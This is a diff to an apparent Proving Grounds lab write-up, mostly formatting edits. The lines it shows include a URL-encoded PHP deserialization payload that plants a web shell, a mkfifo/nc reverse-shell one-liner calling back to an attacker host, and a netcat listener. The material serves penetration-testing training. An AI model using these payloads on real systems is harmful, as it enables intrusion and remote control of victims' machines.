@@ -35,8 +35,8 @@ description: "This guide provides readers with the solution to the Proving Groun
 ![](Screenshot%202026-04-17%20at%2009.21.50.png)
 
 
-curl http://192.168.236.223/backup.zip -o backup.zip
-unzip backup.zip
+`curl http://192.168.236.223/backup.zip -o backup.zip`  
+`unzip backup.zip`
 
 ![](Screenshot%202026-04-18%20at%2015.09.46.png)
 
@@ -63,15 +63,12 @@ print urlencode(serialize(new AddSubscriber));
 ?>
 ```
 
-```
 [IP] [debug=true] [message=O%3A13%3A%22A.....] [email=test@test.com ]
-```
 
 ![](Screenshot%202026-04-18%20at%2015.43.09.png)
 
 ```
-http://192.168.236.223/index.php?debug=true&message=O%3A13%3A%22AddSubscriber%22%3A2%3A%7Bs%3A8%3A%22sub_file%22%3Bs%3A12%3A%22itsatrap.php%22%3Bs%3A4%3A%22info%22%3Bs%3A30%3A%22%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%22%3B%7D&email=test@test.com
-
+http://192.168.236.223/index.php?debug=true&message=O%3A13%3A%22AddSubscriber%22%3A2%3A%7Bs%3A8%3A%22sub_file%22%3Bs%3A12%3A%22itsatrap.php%22%3Bs%3A4%3A%22info%22%3Bs%3A30%3A%22%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%22%3B%7D&email=test@test.co
 ```
 
 ![](Screenshot%202026-04-19%20at%2012.49.53.png)
@@ -91,8 +88,8 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.195 80 >/tmp/
 ```
 
 
-Start a listener:
-Kali: rlwrap nc -lnvp 80 
+Start a listener:  
+Kali: `rlwrap nc -lnvp 80` 
 
 URL encode this command:
 
@@ -149,7 +146,7 @@ chmod 777 agent
 ![](Screenshot%202026-04-20%20at%2008.00.55.png)
 
 Start the session:
-session > select 1 > start
+session >  1 > start
 
 ![](Screenshot%202026-04-20%20at%2008.09.53.png)
 
